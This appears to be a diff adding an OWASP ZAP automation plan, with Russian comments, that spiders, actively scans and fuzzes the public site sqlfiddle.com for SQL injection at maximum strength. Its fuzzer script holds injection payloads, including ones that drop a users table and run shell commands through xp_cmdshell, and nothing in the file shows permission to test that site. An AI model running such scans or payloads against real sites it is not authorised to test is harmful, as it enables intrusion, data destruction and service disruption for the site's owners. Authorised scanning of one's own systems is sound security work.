@@ -1,0 +1,117 @@
+---
+env:
+  contexts:
+  - name: "sqlfiddle"
+    urls:
+    - "https://sqlfiddle.com/"
+    includePaths:
+    - "https://sqlfiddle.com/.*"
+    excludePaths:
+    - "https://sqlfiddle.com/logout.*"
+    - "https://sqlfiddle.com/admin.*"
+  authentication:
+    method: "formBasedAuthentication"
+    context: "sqlfiddle"
+    loginUrl: "https://sqlfiddle.com/login"  # Замените на реальный URL логина, если есть
+    username: "your_password"  # Замените на реальный логин
+    password: "your_password"  # Замените на реальный пароль
+    loginRequestData: "username={%username}&password={%password}"  # Формат данных формы
+    verifyString: "Welcome"  # Строка для проверки успешного логина
+
+jobs:
+- type: spider
+  name: "Full Traditional Spider"
+  parameters:
+    context: "sqlfiddle"
+    maxChildren: 20
+    maxDepth: 10
+    requestWaitTime: 1000
+    handleParameters: all
+
+- type: ajaxSpider
+  name: "AJAX Spider"
+  parameters:
+    context: "sqlfiddle"
+    browserId: "firefox-headless"
+    numberOfBrowsers: 2
+    clickOnce: false
+    clickDefaultElements: true
+    randomInputs: true
+    maxCrawlStates: 50
+
+- type: passiveScan
+  name: "Passive Scan"
+  parameters:
+    maxAlertsPerRule: 20
+
+- type: active
+  name: "Full Active Scan for SQL Injection"
+  parameters:
+    context: "sqlfiddle"
+    maxRuleDurationInMins: 15  # Увеличено для более тщательного сканирования
+    maxScanDurationInMins: 90  # Увеличено для полного охвата
+    threadCount: 4  # Увеличение потоков для ускорения
+  rules:
+    # SQL Injection rules with high strength and low threshold
+    - id: 40018  # SQL Injection (generic)
+      threshold: low
+      strength: high
+    - id: 40019  # SQL Injection - MySQL
+      threshold: low
+      strength: high
+    - id: 40020  # SQL Injection - Hypersonic
+      threshold: low
+      strength: high
+    - id: 40021  # SQL Injection - Oracle
+      threshold: low
+      strength: high
+    - id: 40022  # SQL Injection - PostgreSQL
+      threshold: low
+      strength: high
+    - id: 40023  # SQL Injection - MsSQL
+      threshold: low
+      strength: high
+    - id: 40025  # SQL Injection - SQLite
+      threshold: low
+      strength: high
+    # Дополнительные варианты SQLi
+    - id: 40027  # SQL Injection - Time Based
+      threshold: low
+      strength: high
+    - id: 40028  # SQL Injection - Error Based
+      threshold: low
+      strength: high
+
+- type: fuzzer
+  name: "SQL Injection Fuzzer"
+  parameters:
+    context: "sqlfiddle"
+    url: "https://sqlfiddle.com/.*"  # Фокусировка на всех путях
+    method: "GET,POST"  # Тестирование GET и POST
+    payloadSources:
+    - type: "script"
+      script: |
+        function getPayloads() {
+          return [
+            "' OR '1'='1",
+            "1; DROP TABLE users --",
+            "' UNION SELECT NULL --",
+            "1 WAITFOR DELAY '0:0:5' --",
+            "'; EXEC xp_cmdshell('dir') --"
+          ];
+        }
+    attackStrength: "insane"  # Максимальная интенсивность
+    maxRequests: 1000  # Ограничение для предотвращения перегрузки
+    maxDurationInMins: 30  # Таймаут для fuzzer
+
+- type: report
+  name: "SQL Injection Scan Report"
+  parameters:
+    template: "traditional-html"
+    reportDir: "C:\\Users\\vit81\\Documents\\zap"
+    reportFile: "zap-sqli-enhanced-report.html"
+    reportTitle: "Enhanced SQL Injection Scan Report for sqlfiddle.com"
+    reportDescription: "Comprehensive automated scan with fuzzing for SQL injection vulnerabilities"
+    risks: high,medium,low
+    confidences: high,medium,low,falsepositive
+    sections: siteRisks,riskDesc,traditionalStats,alertsTree,alerts
